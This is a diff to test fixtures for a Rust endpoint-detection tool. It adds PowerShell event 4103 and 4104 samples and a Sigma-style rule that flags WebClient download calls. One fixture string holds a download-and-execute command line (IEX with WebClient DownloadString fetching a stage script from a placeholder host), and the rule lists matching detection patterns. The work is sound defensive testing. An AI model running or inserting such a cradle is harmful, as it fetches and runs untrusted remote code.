@@ -10,7 +10,7 @@ use rustinel::config::IocConfig;
 use rustinel::models::ecs::EcsAlert;
 use rustinel::models::{
     Alert, DnsQueryFields, EventFields, FileEventFields, NetworkConnectionFields, NormalizedEvent,
-    ProcessCreationFields, ServiceCreationFields,
+    PowerShellModuleFields, PowerShellScriptFields, ProcessCreationFields, ServiceCreationFields,
 };
 use rustinel::normalizer::Normalizer;
 use rustinel::sensor::{
@@ -261,6 +261,77 @@ pub fn dns_query_event(platform: Platform) -> SensorEvent {
     }
 }
 
+/// PowerShell module logging context, in the shape event 4103 delivers it: a
+/// newline-separated `name = value` block whose `Host Application` line carries
+/// the full interpreter command line.
+pub const TEST_PS_MODULE_CONTEXT: &str = concat!(
+    "        Severity = Informational\n",
+    "        Host Name = ConsoleHost\n",
+    "        Host Version = 5.1.26100.9168\n",
+    "        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ",
+    "-NoProfile -Command IEX (New-Object System.Net.WebClient)",
+    ".DownloadString('http://example.test/stage.ps1')\n",
+    "        Command Name = New-Object\n",
+    "        Command Type = Cmdlet\n",
+    "        User = lab\\alice\n",
+    "        Shell ID = Microsoft.PowerShell",
+);
+
+pub const TEST_PS_MODULE_PAYLOAD: &str = concat!(
+    "CommandInvocation(New-Object): \"New-Object\"\n",
+    "ParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"",
+);
+
+/// Windows PowerShell module logging event (ETW 4103), the `ps_module`
+/// logsource. Only Windows publishes it, so there is no platform parameter.
+pub fn powershell_module_event() -> SensorEvent {
+    SensorEvent {
+        platform: Platform::Windows,
+        provider: "etw",
+        action: SensorAction::Execute,
+        normalization: SensorNormalization {
+            event_id: 4103,
+            action_code: 0,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        process_start_key: None,
+        payload: SensorPayload::PowerShellModule(PowerShellModuleFields {
+            context_info: Some(TEST_PS_MODULE_CONTEXT.to_string()),
+            payload: Some(TEST_PS_MODULE_PAYLOAD.to_string()),
+            process_id: Some(TEST_PID.to_string()),
+            image: None,
+            user: None,
+        }),
+    }
+}
+
+/// Windows PowerShell script-block logging event (ETW 4104), the existing
+/// `ps_script` logsource. This keeps the compatibility test independent of a
+/// live PowerShell provider.
+pub fn powershell_script_event() -> SensorEvent {
+    SensorEvent {
+        platform: Platform::Windows,
+        provider: "etw",
+        action: SensorAction::Execute,
+        normalization: SensorNormalization {
+            event_id: 4104,
+            action_code: 0,
+        },
+        pid: Some(TEST_PID),
+        timestamp: test_time(),
+        process_start_key: None,
+        payload: SensorPayload::Scripting(PowerShellScriptFields {
+            script_block_text: Some("Get-Process".to_string()),
+            script_block_id: Some("script-block-4104".to_string()),
+            path: Some(r"C:\lab\fixture.ps1".to_string()),
+            process_id: Some(TEST_PID.to_string()),
+            image: Some(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string()),
+            user: Some("LAB\\alice".to_string()),
+        }),
+    }
+}
+
 /// Build a file event whose numbering comes from the shared sensor table, so
 /// fixtures cannot encode a mapping that no sensor actually emits.
 pub fn file_event(
@@ -343,6 +414,30 @@ detection:
 level: high
 "#
             ),
+        )
+    }
+
+    /// A `ps_module` rule shaped like the SigmaHQ corpus: no `service`, and
+    /// selections that read only `ContextInfo` and `Payload`.
+    pub fn write_ps_module_rule(&self) -> PathBuf {
+        self.write_rule(
+            "ps_module.yml",
+            r#"title: Test PowerShell Module Download
+logsource:
+  product: windows
+  category: ps_module
+detection:
+  selection_webclient:
+    ContextInfo|contains: "System.Net.WebClient"
+  selection_function:
+    ContextInfo|contains:
+      - ".DownloadFile("
+      - ".DownloadString("
+  selection_payload:
+    Payload|contains: "CommandInvocation(New-Object)"
+  condition: all of selection_*
+level: medium
+"#,
         )
     }
 
@@ -566,6 +661,7 @@ pub fn event_fields_from_payload(event: SensorEvent) -> EventFields {
         SensorPayload::Registry(fields) => EventFields::RegistryEvent(fields),
         SensorPayload::ImageLoad(fields) => EventFields::ImageLoad(fields),
         SensorPayload::Scripting(fields) => EventFields::PowerShellScript(fields),
+        SensorPayload::PowerShellModule(fields) => EventFields::PowerShellModule(fields),
         SensorPayload::Wmi(fields) => EventFields::WmiEvent(fields),
         SensorPayload::Service(fields) => EventFields::ServiceCreation(fields),
         SensorPayload::Task(fields) => EventFields::TaskCreation(fields),
